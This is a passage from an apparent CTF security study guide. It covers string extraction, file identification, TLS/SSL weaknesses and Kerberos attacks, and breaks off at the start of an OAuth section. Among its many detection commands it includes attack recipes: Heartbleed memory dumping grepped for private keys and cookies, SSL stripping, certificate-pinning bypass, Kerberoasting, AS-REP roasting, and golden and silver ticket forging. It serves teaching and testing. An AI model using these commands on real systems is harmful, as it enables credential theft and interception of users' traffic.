To extract the string at offset 0x1000 (4096 bytes):

```bash
dd if=binary_file bs=1 skip=4096 count=16
```

##### Encoded String Detection

Strings may be Base64, hex, or otherwise encoded. Process output through additional tools:

```bash
strings binary_file | base64 -d 2>/dev/null | strings
```

This extracts strings, attempts Base64 decoding on each, and re-extracts strings from the decoded output. Redirect stderr to suppress decoding errors on non-base64 strings.

For repeated encoding layers:

```bash
strings binary_file | while read line; do
  echo "$line" | base64 -d 2>/dev/null
done
```

##### Dynamic Analysis Integration

Extract strings from running processes:

```bash
strings /proc/<PID>/maps
strings /proc/<PID>/mem
```

This examines memory maps and memory contents of running processes. Combine with `grep` to search for suspicious strings or hardcoded credentials.

### `file` Command

The `file` command identifies file types by analyzing magic bytes (file signatures) and structure, essential for CTF scenarios with misidentified or disguised files.

##### Basic File Type Detection

Identify file type:

```bash
file unknown_file
```

Output example: `unknown_file: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked...`

The command reads magic bytes and compares against known signatures. This determines whether a file is executable, archive, image, etc.

##### MIME Type Output

Display MIME type suitable for web contexts:

```bash
file -i suspicious_file
```

Output example: `suspicious_file: application/x-executable; charset=binary`

Useful for determining if a web-served file has been misidentified.

##### Recursive Directory Scanning

Scan all files in a directory and subdirectories:

```bash
file -r directory/
```

Pipes output through a pager for large directories. Combine with grep:

```bash
file -r directory/ | grep -i zip
```

Finds all compressed archives in the directory tree.

##### Magic File Analysis

Specify custom magic file for extended detection:

```bash
file -m custom_magic.mgc unknown_file
```

Advanced CTF scenarios include custom file signatures. Compile a custom magic file:

```bash
file -C -m custom_magic.txt
```

The `-C` option compiles the text magic file into binary format (`.mgc`).

Example custom magic entry (detect custom CTF flag format):

```
0 string FLAG{ FLAG_file
>5 string } Custom_flag_format
```

##### Checking File Integrity

Verify file wasn't corrupted during transfer:

```bash
file original_file
file transferred_file
```

Identical output suggests identical file structure. Compare with checksums for certainty:

```bash
md5sum original_file transferred_file
```

##### Detecting Obfuscated Files

Misidentified file extensions are common CTF tricks. Check actual type:

```bash
file image.jpg
```

If output shows `Zip archive` instead of JPEG, the file is actually a compressed archive. Extract accordingly:

```bash
unzip image.jpg
```

[Inference] Some CTF challenges concatenate multiple files. Use `file` to identify boundaries:

```bash
file -b unknown_blob
```

The `-b` option displays only the file type without filename. Process large blobs by splitting and checking sections:

```bash
dd if=blob bs=1024 skip=0 count=1 | file -
dd if=blob bs=1024 skip=1 count=1 | file -
```

This incrementally checks 1KB sections to find file boundaries.

##### Extracting Embedded Files

When `file` identifies archives or embedded data within binaries, extract with appropriate tools:

```bash
file target_file  # Identifies type
strings target_file | grep -E "PK|Rar|7z"  # Searches for nested archive signatures
```

If nested, use `binwalk` for automated extraction:

```bash
binwalk -e target_file
```

Related Topics: Steganography Analysis (detecting hidden files in images), Polyglot Files (files with multiple valid formats), Archive Forensics (ZIP, RAR, 7z recovery), Malware Identification (distinguishing packers and obfuscators).

---

# PROTOCOL SECURITY

## TLS/SSL

### Protocol Versions (SSLv2, SSLv3, TLS 1.0-1.3)

#### Version History and Vulnerabilities

**SSLv2 (1995)**

- Fundamentally broken protocol with no cryptographic integrity
- Vulnerable to man-in-the-middle attacks allowing cipher suite downgrade
- No support for certificate chain validation
- Uses weak MAC construction (truncated MD5)
- Testing command: `nmap --script ssl-enum-ciphers -p 443 <target>`
- Exploitation: Use `sslscan` to identify: `sslscan --no-failed <target>`

**SSLv3 (1996)**

- Deprecated due to POODLE attack (CVE-2014-3566)
- POODLE exploits CBC mode padding oracle in SSLv3
- Allows decryption of secure cookies and authentication tokens
- Detection: `testssl.sh --protocols <target>:443`
- Exploitation tool: `poodle-poc` (available in GitHub repositories)
- Mitigation check: `openssl s_client -connect <target>:443 -ssl3` (should fail)

**TLS 1.0 (1999)**

- Vulnerable to BEAST attack (CVE-2011-3389) exploiting CBC IV predictability
- Susceptible to CRIME (CVE-2012-4929) via TLS compression
- Still supports weak cipher suites (RC4, DES)
- Enumeration: `nmap --script ssl-enum-ciphers -p 443 <target> | grep "TLSv1.0"`
- [Unverified] Some implementations may have additional timing vulnerabilities

**TLS 1.1 (2006)**

- Fixed BEAST by using explicit IVs instead of chained IVs
- Removed support for export-grade ciphers
- Still deprecated as of 2020 by major browsers
- Limited CTF relevance except in legacy system scenarios

**TLS 1.2 (2008)**

- Introduced AEAD cipher suites (GCM, CCM)
- Added SHA-256 hash support for handshake verification
- Vulnerable to Lucky13 (CVE-2013-0169) timing attack in CBC mode
- Susceptible to CRIME/BREACH if compression enabled
- RC4 still available but deprecated (RC4 NOMORE attack)
- Testing: `testssl.sh --protocols --cipher-per-proto <target>:443`

**TLS 1.3 (2018)**

- Removed RSA key exchange (forward secrecy mandatory)
- Eliminated CBC mode ciphers entirely
- Reduced handshake to 1-RTT (0-RTT optional but has replay risks)
- Only supports: AES-GCM, AES-CCM, ChaCha20-Poly1305
- Enumeration: `openssl s_client -connect <target>:443 -tls1_3`
- No known protocol-level vulnerabilities in core specification

#### Version Downgrade Attacks

**Tools for forcing downgrades:**

```bash
# SSLstrip for HTTPS stripping
sslstrip -l 443 -w sslstrip.log

# Bettercap for MitM with SSL stripping
bettercap -iface eth0
> set http.proxy.sslstrip true
> http.proxy on

# Manual downgrade testing
openssl s_client -connect <target>:443 -no_tls1_3 -no_tls1_2
```

### Cipher Suites

#### Cipher Suite Structure

Standard format: `TLS_<KeyExchange>_<Authentication>_WITH_<Encryption>_<MAC>`

Example: `TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384`

- Key Exchange: ECDHE (Elliptic Curve Diffie-Hellman Ephemeral)
- Authentication: RSA
- Encryption: AES-256-GCM
- MAC: SHA384

#### Weak Cipher Identification

**Export-grade ciphers (FREAK - CVE-2015-0204):**

```bash
# Test for FREAK vulnerability
nmap --script ssl-enum-ciphers -p 443 <target> | grep "export"

# OpenSSL test
openssl s_client -connect <target>:443 -cipher "EXPORT"
```

**NULL ciphers (no encryption):**

```bash
openssl s_client -connect <target>:443 -cipher "NULL"
nmap --script ssl-enum-ciphers | grep "NULL"
```

**Weak symmetric algorithms:**

- DES/3DES: Sweet32 attack (CVE-2016-2183) - 64-bit block size collision
- RC4: RC4 NOMORE attack - biased keystream bytes
- Detection: `testssl.sh --ciphers <target>:443`

**Anonymous Diffie-Hellman (ADH/AECDH):**

- No authentication - trivial MitM
- Testing: `openssl s_client -connect <target>:443 -cipher "ADH"`

#### Cipher Suite Enumeration Tools

**SSLScan (comprehensive analysis):**

```bash
sslscan --show-certificate --show-client-cas <target>:443
sslscan --xml=output.xml <target>:443
```

**Testssl.sh (detailed vulnerability scanning):**

```bash
testssl.sh --cipher-per-proto --warnings batch <target>:443
testssl.sh --vulnerable <target>:443  # Known vulnerabilities only
testssl.sh --severity HIGH <target>:443
```

**Nmap NSE scripts:**

```bash
nmap --script ssl-enum-ciphers,ssl-cert,ssl-known-key -p 443 <target>
nmap --script ssl-dh-params -p 443 <target>  # Logjam detection
```

**Manual cipher testing:**

```bash
# Test specific cipher
openssl s_client -connect <target>:443 -cipher 'ECDHE-RSA-AES256-GCM-SHA384'

# Test cipher list
for cipher in $(openssl ciphers 'ALL:eNULL' | tr ':' ' '); do
    openssl s_client -cipher "$cipher" -connect <target>:443 < /dev/null 2>&1 | grep -q "Cipher is" && echo "$cipher"
done
```

#### Cipher Suite Exploitation

**Logjam (CVE-2015-4000) - Weak DHE parameters:**

```bash
# Detection
testssl.sh --dh <target>:443
nmap --script ssl-dh-params <target>

# Exploitation requires DH parameter < 1024 bits
# Use specialized tools like logjam-tools from GitHub
```

### Handshake Process

#### TLS 1.2 Full Handshake

**Packet sequence:**

1. **ClientHello** - Client sends:
    
    - Supported protocol versions
    - Random nonce (32 bytes)
    - Session ID (for resumption)
    - Cipher suite list (client preference)
    - Compression methods
    - Extensions (SNI, ALPN, signature algorithms)
2. **ServerHello** - Server responds:
    
    - Selected protocol version
    - Random nonce (32 bytes)
    - Session ID
    - Selected cipher suite
    - Selected compression
    - Extensions
3. **Certificate** - Server sends X.509 certificate chain
    
4. **ServerKeyExchange** - Server sends (if required by cipher):
    
    - DHE/ECDHE parameters
    - Signature over parameters
5. **CertificateRequest** - Server requests client cert (optional)
    
6. **ServerHelloDone** - Server signals completion
    
7. **Certificate** - Client sends cert (if requested)
    
8. **ClientKeyExchange** - Client sends:
    
    - Pre-master secret encrypted with server public key (RSA)
    - DH/ECDH public key (DHE/ECDHE)
9. **CertificateVerify** - Client proves cert ownership (if sent)
    
10. **ChangeCipherSpec** - Client signals encryption start
    
11. **Finished** - Client sends encrypted handshake verification
    
12. **ChangeCipherSpec** - Server signals encryption start
    
13. **Finished** - Server sends encrypted handshake verification
    

#### Handshake Capture and Analysis

**Wireshark filters:**

```
ssl.handshake.type == 1  # ClientHello
ssl.handshake.type == 2  # ServerHello
ssl.handshake.type == 11 # Certificate
ssl.handshake.type == 12 # ServerKeyExchange
ssl.handshake.type == 14 # ServerHelloDone
ssl.handshake.type == 16 # ClientKeyExchange
```

**TCPdump capture:**

```bash
tcpdump -i eth0 -s 0 -w tls_capture.pcap 'tcp port 443'

# With specific host
tcpdump -i eth0 -s 0 -w tls_capture.pcap 'host <target> and tcp port 443'
```

**SSLDump for real-time analysis:**

```bash
ssldump -i eth0 -d -N -A  # Decode and show all fields
ssldump -i eth0 -k server.key -d  # With private key for decryption
```

#### Session Resumption

**Session ID resumption:**

- Client sends previous Session ID in ClientHello
- Server responds with same Session ID if valid
- Abbreviated handshake skips certificate exchange
- Testing: Capture two consecutive connections and compare Session IDs

**Session Tickets (RFC 5077):**

- Server sends encrypted session state to client
- Client presents ticket in subsequent connections
- Vulnerable to key reuse attacks if rotation not implemented
- Detection: Look for `SessionTicket` extension in Wireshark

**Exploitation considerations:**

- Session tickets encrypted with server key may persist across key rotations
- [Inference] Compromised ticket encryption key could allow session hijacking

#### Renegotiation

**Secure renegotiation (RFC 5746):**

- Prevents MitM injection attacks during renegotiation
- Detection: Look for `renegotiation_info` extension
- Testing:

```bash
openssl s_client -connect <target>:443
# After connection, type 'R' for renegotiation
```

**Renegotiation vulnerabilities:**

- CVE-2009-3555: Plaintext injection during renegotiation
- Testing: `testssl.sh --reneg <target>:443`

#### Heartbeat and Heartbleed

**Heartbleed (CVE-2014-0160):**

- Buffer over-read in TLS heartbeat extension
- Leaks up to 64KB of process memory per request
- Can expose private keys, session keys, passwords

**Detection:**

```bash
nmap --script ssl-heartbleed -p 443 <target>
testssl.sh --heartbleed <target>:443
```

**Exploitation:**

```bash
# Using Metasploit
msfconsole
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS <target>
set RPORT 443
set VERBOSE true
run

# Manual exploitation (ssltest.py from GitHub)
python ssltest.py <target> -p 443 -n 10  # 10 heartbeat requests
```

### Certificate Validation

#### X.509 Certificate Structure

**Critical fields for CTF scenarios:**

- **Subject**: CN (Common Name), O (Organization), OU, C
- **Issuer**: CA that signed the certificate
- **Validity**: Not Before / Not After dates
- **Public Key**: Algorithm and key bits
- **Subject Alternative Names (SAN)**: Additional valid hostnames
- **Key Usage**: Digital Signature, Key Encipherment, etc.
- **Extended Key Usage**: Server Auth, Client Auth, Code Signing
- **Basic Constraints**: CA:TRUE/FALSE, path length
- **Authority Key Identifier**: Links to issuer cert
- **Subject Key Identifier**: Unique cert identifier

#### Certificate Extraction and Analysis

**OpenSSL examination:**

```bash
# View certificate details
openssl s_client -connect <target>:443 -showcerts </dev/null

# Save certificate
openssl s_client -connect <target>:443 -showcerts </dev/null 2>/dev/null | \
  openssl x509 -outform PEM > cert.pem

# Parse certificate
openssl x509 -in cert.pem -text -noout

# Check specific fields
openssl x509 -in cert.pem -noout -subject
openssl x509 -in cert.pem -noout -issuer
openssl x509 -in cert.pem -noout -dates
openssl x509 -in cert.pem -noout -fingerprint -sha256

# Extract public key
openssl x509 -in cert.pem -pubkey -noout > pubkey.pem

# View SAN
openssl x509 -in cert.pem -noout -ext subjectAltName
```

**Certificate chain validation:**

```bash
# Verify against system CA bundle
openssl verify cert.pem

# Verify with specific CA
openssl verify -CAfile ca-bundle.crt cert.pem

# Build and verify full chain
openssl verify -CAfile root.crt -untrusted intermediate.crt cert.pem
```

#### Common Certificate Validation Vulnerabilities

**Self-signed certificates:**

```bash
# Detection
openssl s_client -connect <target>:443 </dev/null 2>&1 | grep "self signed"

# Exploitation: Application may not properly validate, allowing MitM
```

**Expired certificates:**

```bash
# Check expiration
openssl s_client -connect <target>:443 </dev/null 2>&1 | openssl x509 -noout -dates

# Some applications fail to validate expiration
```

**Hostname mismatch:**

- Certificate CN/SAN does not match requested hostname
- Detection: OpenSSL will show `verify error:num=62:hostname mismatch`
- Testing: `openssl s_client -connect <ip>:443 -servername example.com`

**Weak signature algorithms:**

```bash
# Check signature algorithm
openssl x509 -in cert.pem -noout -text | grep "Signature Algorithm"

# Weak algorithms: MD5, SHA-1 (deprecated since 2017)
# Detection with testssl.sh
testssl.sh --server-preference <target>:443
```

**Certificate Transparency (CT) logs:**

```bash
# Check if certificate is in CT logs
# Use online tools: crt.sh, censys.io
curl "https://crt.sh/?q=example.com&output=json"
```

#### Certificate Pinning Bypass

**HPKP (HTTP Public Key Pinning) - deprecated:**

- Header: `Public-Key-Pins: pin-sha256="<hash>"; max-age=<seconds>`
- Testing: Check response headers for HPKP
- [Unverified] Bypass may involve exploiting backup pin inclusion

**Application-level pinning:**

- Mobile apps often pin specific certificates or public keys
- Bypass techniques for testing:
    - Frida scripts to hook SSL validation functions
    - Patching APK/IPA to remove pinning checks
    - Proxy tools: Burp Suite, mitmproxy with custom certificates

**Tools for pinning bypass:**

```bash
# Objection (for mobile)
objection explore
android sslpinning disable

# Frida script example (conceptual)
frida -U -f com.example.app -l ssl-pinning-bypass.js

# SSL Kill Switch (iOS jailbreak)
# Installs via Cydia repository
```

#### Common Name (CN) Parsing Vulnerabilities

**NULL byte injection:**

- Certificates with embedded NULL bytes in CN: `example.com\0attacker.com`
- Vulnerable parsers stop at NULL, validating against `example.com`
- [Unverified] Modern libraries typically reject NULL bytes, but legacy systems may be vulnerable

**Wildcard certificate abuse:**

- `*.example.com` matches `sub.example.com` but not `example.com`
- Some implementations incorrectly accept multi-level: `*.*.example.com`
- Testing: Request cert with unusual wildcard patterns

#### CA Trust Store Analysis

**System trust store locations:**

- Linux: `/etc/ssl/certs/`, `/etc/pki/tls/certs/`
- View system CAs: `awk -v cmd='openssl x509 -noout -subject' '/BEGIN/{close(cmd)};{print | cmd}' < /etc/ssl/certs/ca-certificates.crt`

**Custom CA injection:**

```bash
# Add custom CA (for testing)
cp custom-ca.crt /usr/local/share/ca-certificates/
update-ca-certificates

# OpenSSL specific CA directory
export SSL_CERT_DIR=/path/to/custom/ca/dir
```

#### CRL and OCSP

**Certificate Revocation List (CRL):**

```bash
# Extract CRL URL from certificate
openssl x509 -in cert.pem -noout -text | grep -A 4 "CRL Distribution"

# Download and verify CRL
wget http://crl.example.com/ca.crl
openssl crl -in ca.crl -inform DER -text -noout
```

**Online Certificate Status Protocol (OCSP):**

```bash
# Extract OCSP URL
openssl x509 -in cert.pem -noout -ocsp_uri

# Check OCSP status
openssl ocsp -issuer issuer.crt -cert cert.pem \
  -url http://ocsp.example.com -resp_text

# OCSP stapling check
openssl s_client -connect <target>:443 -status
```

**OCSP Must-Staple:**

- Extension requiring OCSP stapling
- Detection: `openssl x509 -in cert.pem -noout -ext tlsfeature`
- [Inference] Non-compliant servers with must-staple certs should be rejected by clients

---

**Important related topics for comprehensive TLS/SSL exploitation:**

- Man-in-the-Middle frameworks (mitmproxy, Burp Suite, Bettercap)
- RSA encryption padding vulnerabilities (PKCS#1 v1.5, Bleichenbacher attacks)
- Elliptic curve cryptography weaknesses in TLS
- TLS 1.3 0-RTT replay attacks
- Traffic analysis and timing attacks on encrypted connections

---

## TLS Vulnerabilities

### HEARTBLEED

**CVE-2014-0160** - A critical vulnerability in OpenSSL's implementation of the TLS/DTLS heartbeat extension (RFC 6520) that allowed attackers to read up to 64KB of server memory per request.

**Technical Mechanism**

The vulnerability exists in OpenSSL versions 1.0.1 through 1.0.1f. The heartbeat implementation failed to validate the payload length field, allowing attackers to request more data than was actually sent. The server would then return arbitrary memory contents including:

- Private keys
- Session cookies
- User credentials
- SSL certificate private keys
- Process memory contents

**Exploitation Tools & Techniques**

```bash
# Metasploit module
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS target.com
set RPORT 443
set VERBOSE true
run

# Standalone Python script (heartbleed.py)
python heartbleed.py target.com -p 443 -n 10

# Nmap NSE script
nmap -p 443 --script ssl-heartbleed target.com
nmap -sV --script ssl-heartbleed -p 443 target.com

# Manual testing with OpenSSL (requires custom build)
echo -e "\x18\x03\x02\x00\x03\x01\x40\x00" | openssl s_client -connect target.com:443
```

**CTF-Specific Extraction Strategies**

Memory dumps from Heartbleed often contain:

- Repeated requests (10-100+) to increase likelihood of valuable data
- Pattern recognition for keys: `-----BEGIN RSA PRIVATE KEY-----`
- Session token extraction from HTTP headers in memory
- Base64-encoded credentials

```bash
# Automated key extraction
for i in {1..100}; do
    python heartbleed.py target.com -p 443 >> dump_$i.bin
done

grep -a "BEGIN RSA PRIVATE KEY" dump_*.bin
grep -a "Cookie:" dump_*.bin
```

**Detection**

```bash
# SSLscan
sslscan --no-failed target.com:443

# TestSSL.sh
./testssl.sh --heartbleed target.com:443

# Nmap version detection
nmap -sV -p 443 --script ssl-heartbleed,ssl-cert target.com
```

### POODLE

**CVE-2014-3566** (Padding Oracle On Downgraded Legacy Encryption) - An attack exploiting weaknesses in SSL 3.0's CBC mode cipher padding validation.

**Technical Mechanism**

SSL 3.0 does not properly verify MAC-then-encrypt padding bytes. In CBC mode, attackers can:

1. Force protocol downgrade to SSL 3.0
2. Inject chosen plaintext
3. Observe padding oracle responses
4. Decrypt ciphertext byte-by-byte (256 requests average per byte)

The attack specifically targets the last block of padding, exploiting that SSL 3.0 only checks the last byte of padding, not the entire padding structure.

**Exploitation Requirements**

- Man-in-the-middle position or malicious JavaScript injection
- Server supporting SSL 3.0
- Target using CBC mode ciphers
- Ability to generate multiple encrypted requests (session cookies in HTTP)

**Testing for POODLE**

```bash
# OpenSSL client test
openssl s_client -connect target.com:443 -ssl3

# If connection succeeds, SSL 3.0 is enabled (vulnerable)
# Expected output: "Cipher is ECDHE-RSA-AES128-SHA" or similar

# Nmap NSE script
nmap --script ssl-poodle -p 443 target.com

# TestSSL.sh comprehensive test
./testssl.sh --poodle target.com:443

# Manual curl test
curl -v --sslv3 https://target.com
# If successful, server accepts SSL 3.0
```

**POODLE-TLS Variant (CVE-2014-8730)**

[Unverified] Some TLS implementations may exhibit similar padding oracle behavior even with TLS 1.0-1.2. Testing requires:

```bash
# TLS-POODLE specific testing
./testssl.sh --poodle-tls target.com:443
```

**CTF Exploitation Approach**

```python
# Conceptual POODLE exploitation (requires MITM position)
# Python with Scapy for packet manipulation

from scapy.all import *

# 1. Intercept SSL 3.0 handshake
# 2. Inject malicious blocks
# 3. Observe error responses (oracle)
# 4. Byte-by-byte decryption

# Typical CTF scenario: Decrypt admin cookie
# Average 256 requests per byte
# 16-byte block = 4096 requests average
```

### BEAST

**CVE-2011-3389** (Browser Exploit Against SSL/TLS) - A chosen-plaintext attack exploiting CBC cipher predictable IVs in TLS 1.0 and earlier.

**Technical Mechanism**

TLS 1.0 uses the last ciphertext block as the IV for the next record. Attackers with:

- MITM position
- Ability to inject chosen plaintext (JavaScript in browser context)

Can predict IVs and decrypt HTTPS cookies through:

1. Blockwise chosen-boundary attack
2. IV prediction from previous ciphertext block
3. XOR manipulation to decrypt target bytes

**Vulnerability Scope**

- TLS 1.0 with CBC mode ciphers (AES-CBC, DES-CBC, 3DES-CBC)
- Does NOT affect TLS 1.1+ (uses explicit random IVs)
- Does NOT affect RC4 (stream cipher, though RC4 has other vulnerabilities)

**Detection**

```bash
# Check for TLS 1.0 with CBC ciphers
sslscan target.com:443 | grep -E "TLSv1.0|CBC"

# Nmap cipher enumeration
nmap --script ssl-enum-ciphers -p 443 target.com

# TestSSL.sh
./testssl.sh --protocols target.com:443

# OpenSSL manual check
openssl s_client -connect target.com:443 -tls1 -cipher 'AES128-SHA'
# If successful with CBC cipher on TLS 1.0, vulnerable

# Specific BEAST detection
nmap --script ssl-known-key -p 443 target.com
```

**CTF Exploitation Context**

BEAST exploitation in CTF typically requires:

- Pre-positioned MITM capability
- Target application using TLS 1.0
- Session cookies or credentials in HTTPS traffic

```bash
# Cipher priority checking
openssl s_client -connect target.com:443 -tls1 | grep "Cipher"

# Force TLS 1.0 with CBC
openssl s_client -connect target.com:443 -tls1 -cipher 'ECDHE-RSA-AES128-SHA:AES128-SHA'
```

[Inference] In CTF scenarios, BEAST is more commonly a "check the box" vulnerability rather than actively exploited due to attack complexity and requirement for client-side JavaScript injection.

### Downgrade Attacks

Protocol downgrade attacks force clients/servers to negotiate weaker cryptographic protocols or cipher suites than they support.

**Attack Categories**

**1. Protocol Version Downgrade**

```bash
# FREAK (CVE-2015-0204) - Force RSA_EXPORT
openssl s_client -connect target.com:443 -cipher EXPORT

# Logjam (CVE-2015-4000) - Force DHE_EXPORT
openssl s_client -connect target.com:443 -cipher 'EXP-DHE'

# Testing for export cipher support
nmap --script ssl-enum-ciphers -p 443 target.com | grep -i export
```

**2. MITM Protocol Stripping**

- Intercept Client Hello
- Modify supported protocol versions
- Force SSL 3.0 or TLS 1.0

**Detection Tools**

```bash
# Comprehensive downgrade testing
./testssl.sh --protocols --ciphers target.com:443

# Specific downgrade vulnerability checks
nmap -p 443 --script ssl-dh-params,ssl-known-key target.com

# SSLyze for detailed cipher analysis
sslyze --regular target.com:443

# Manual testing for each protocol version
for proto in ssl2 ssl3 tls1 tls1_1 tls1_2 tls1_3; do
    echo "Testing $proto"
    openssl s_client -connect target.com:443 -$proto 2>&1 | grep -E "Cipher|Protocol"
done
```

**FREAK Attack (CVE-2015-0204)**

Factoring RSA Export Keys - Forces use of 512-bit export-grade RSA keys.

```bash
# Detection
openssl s_client -connect target.com:443 -cipher EXPORT

# Nmap NSE
nmap --script ssl-freak -p 443 target.com

# Vulnerable if server accepts EXP-RSA ciphers
# Exploitation involves factoring 512-bit RSA key (feasible with modern resources)
```

**Logjam Attack (CVE-2015-4000)**

Forces use of weak 512-bit Diffie-Hellman groups.

```bash
# Detection
./testssl.sh --logjam target.com:443

# Manual DH parameter check
openssl s_client -connect target.com:443 -cipher 'DHE' | grep 'Server Temp Key'

# Nmap script
nmap --script ssl-dh-params -p 443 target.com
```

**CTF Exploitation Strategy**

```bash
# 1. Enumerate all supported protocols
./testssl.sh --protocols target.com:443 > protocol_scan.txt

# 2. Test for export ciphers
nmap --script ssl-enum-ciphers -p 443 target.com > cipher_scan.txt

# 3. Attempt connection with weak protocols
for cipher in EXPORT EXP-RC4-MD5 EXP-DES-CBC-SHA; do
    openssl s_client -connect target.com:443 -cipher $cipher 2>&1
done

# 4. MITM attack simulation (requires network position)
# Use tools like SSLsplit, mitmproxy with downgrade rules
```

### NULL Cipher Usage

NULL ciphers provide authentication and integrity but NO encryption (plaintext transmission over TLS).

**NULL Cipher Suites**

```
TLS_NULL_WITH_NULL_NULL
TLS_RSA_WITH_NULL_MD5
TLS_RSA_WITH_NULL_SHA
TLS_RSA_WITH_NULL_SHA256
TLS_ECDHE_ECDSA_WITH_NULL_SHA
TLS_ECDHE_RSA_WITH_NULL_SHA
```

**Detection**

```bash
# Direct NULL cipher test
openssl s_client -connect target.com:443 -cipher 'NULL'

# Expected failure on properly configured server:
# "no ciphers available" or "ssl handshake failure"

# Comprehensive NULL cipher scanning
openssl s_client -connect target.com:443 -cipher 'eNULL'

# Nmap NULL cipher detection
nmap --script ssl-enum-ciphers -p 443 target.com | grep -i null

# SSLscan
sslscan target.com:443 | grep -i null

# TestSSL.sh
./testssl.sh --ciphers target.com:443 | grep -i null
```

**Exploitation**

If NULL ciphers are accepted:

```bash
# Connect with NULL cipher
openssl s_client -connect target.com:443 -cipher 'NULL-SHA256'

# Traffic is transmitted in PLAINTEXT
# Can be captured with standard packet sniffing

# Wireshark/tcpdump capture
tcpdump -i eth0 -w null_cipher_capture.pcap host target.com and port 443

# Analyze in Wireshark
# Filter: tcp.port == 443
# Payload will be readable plaintext despite TLS connection
```

**CTF Scenario**

```bash
# 1. Test for NULL cipher acceptance
openssl s_client -connect ctf-target.com:443 -cipher 'NULL-SHA:NULL-SHA256:NULL-MD5'

# 2. If successful, establish connection
echo "GET /flag HTTP/1.1\r\nHost: ctf-target.com\r\n\r\n" | \
    openssl s_client -connect ctf-target.com:443 -cipher 'NULL-SHA' -quiet

# 3. Capture and analyze unencrypted traffic
tcpdump -i any -A port 443 and host ctf-target.com

# 4. Extract credentials/flags from plaintext
```

**Combined Detection Script**

```bash
#!/bin/bash
TARGET="$1"
PORT="${2:-443}"

echo "[+] Testing TLS Vulnerabilities for $TARGET:$PORT"

echo -e "\n[*] Heartbleed (CVE-2014-0160)"
nmap -p $PORT --script ssl-heartbleed $TARGET

echo -e "\n[*] POODLE (SSL 3.0)"
openssl s_client -connect $TARGET:$PORT -ssl3 2>&1 | grep -q "Cipher" && \
    echo "VULNERABLE: SSL 3.0 enabled" || echo "Not vulnerable"

echo -e "\n[*] BEAST (TLS 1.0 CBC)"
openssl s_client -connect $TARGET:$PORT -tls1 -cipher 'AES128-SHA' 2>&1 | \
    grep -q "Cipher" && echo "VULNERABLE: TLS 1.0 with CBC" || echo "Not vulnerable"

echo -e "\n[*] Export Ciphers (Downgrade)"
openssl s_client -connect $TARGET:$PORT -cipher 'EXPORT' 2>&1 | \
    grep -q "Cipher" && echo "VULNERABLE: Export ciphers enabled" || echo "Not vulnerable"

echo -e "\n[*] NULL Ciphers"
openssl s_client -connect $TARGET:$PORT -cipher 'NULL' 2>&1 | \
    grep -q "Cipher" && echo "VULNERABLE: NULL ciphers enabled" || echo "Not vulnerable"
```

**Important Subtopics for Further Study:**

- Certificate validation bypass techniques
- Forward Secrecy and PFS cipher suites
- TLS 1.3 changes and vulnerability mitigation
- CRIME/BREACH compression attacks
- Certificate Transparency and CT log analysis

---

## Authentication Protocols

### Kerberos

Kerberos is a network authentication protocol using symmetric key cryptography and a trusted third-party Key Distribution Center (KDC). It's prevalent in Active Directory environments and common in enterprise CTF challenges.

**Core Components:**

- **KDC (Key Distribution Center)**: Contains the Authentication Service (AS) and Ticket Granting Service (TGS)
- **TGT (Ticket Granting Ticket)**: Encrypted ticket proving user authentication
- **Service Tickets**: Tickets for accessing specific services
- **Realm**: Authentication administrative domain (typically uppercase, e.g., CORP.LOCAL)

**Attack Surface in CTFs:**

**AS-REP Roasting** - Extracting password hashes for accounts without Kerberos pre-authentication:

```bash
# Using Impacket's GetNPUsers.py
GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile hashes.txt

# With credentials for domain enumeration
GetNPUsers.py DOMAIN/username:password -request -format hashcat -outputfile hashes.txt

# From Windows with Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

**Kerberoasting** - Requesting service tickets to crack offline:

```bash
# Using Impacket's GetUserSPNs.py
GetUserSPNs.py DOMAIN/username:password -dc-ip 10.10.10.10 -request

# Save to hashcat format
GetUserSPNs.py DOMAIN/username:password -dc-ip 10.10.10.10 -request -outputfile kerberoast.txt

# Crack with hashcat (mode 13100 for TGS-REP)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# From Windows
Invoke-Kerberoast -OutputFormat Hashcat | fl
```

**Pass-the-Ticket (PtT)** - Using stolen Kerberos tickets:

```bash
# Export tickets from memory (Linux)
impacket-ticketer -nthash <NTLM_hash> -domain-sid <SID> -domain DOMAIN.LOCAL username

# Import ticket
export KRB5CCNAME=/path/to/ticket.ccache

# Use ticket with Impacket tools
psexec.py DOMAIN/username@target -k -no-pass

# Windows - inject with Rubeus
Rubeus.exe ptt /ticket:base64_ticket
```

**Golden/Silver Ticket Attacks** - Forging tickets with compromised credentials:

```bash
# Golden Ticket (requires krbtgt hash)
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_SID> -domain DOMAIN.LOCAL username

# Silver Ticket (requires service account hash)
impacket-ticketer -nthash <service_hash> -domain-sid <domain_SID> -domain DOMAIN.LOCAL -spn cifs/server.domain.local username
```

**Ticket Extraction:**

```bash
# Linux - from keytab files
klist -k /etc/krb5.keytab
ktutil

# Extract from .ccache files
klist -c /tmp/krb5cc_1000

# Windows - using Mimikatz
sekurlsa::tickets /export

# Rubeus
Rubeus.exe dump /service:krbtgt
Rubeus.exe triage
```

**Kerberos Configuration Analysis:**

```bash
# Check krb5.conf for realm information
cat /etc/krb5.conf

# Common misconfigurations to exploit:
# - Weak encryption types (RC4-HMAC)
# - Accessible keytab files
# - Pre-authentication disabled accounts
```

**Tools for Kerberos Exploitation:**

- **Impacket Suite**: GetUserSPNs.py, GetNPUsers.py, ticketer.py, getTGT.py
- **Rubeus** (Windows): Comprehensive Kerberos abuse toolkit
- **Kerbrute**: Username enumeration and password spraying
- **Mimikatz**: Ticket extraction and Pass-the-Ticket

**[Inference]** In CTF scenarios, Kerberos challenges often involve:

- Finding service accounts with SPNs set
- Locating users with pre-authentication disabled
- Extracting tickets from memory dumps or keytab files
- Cracking weak Kerberos tickets offline

---

### OAuth 2.0 / OpenID Connect

OAuth 2.0 is an authorization framework allowing third-party applications limited access to resources. OpenID Connect (OIDC) extends OAuth 2.0 to provide authentication. Common in web application CTF challenges involving API security and SSO.

**Grant Types and Attack Vectors:**

**Authorization Code Flow** - Most secure, but exploitable if misconfigured:

```http
# Initial authorization request
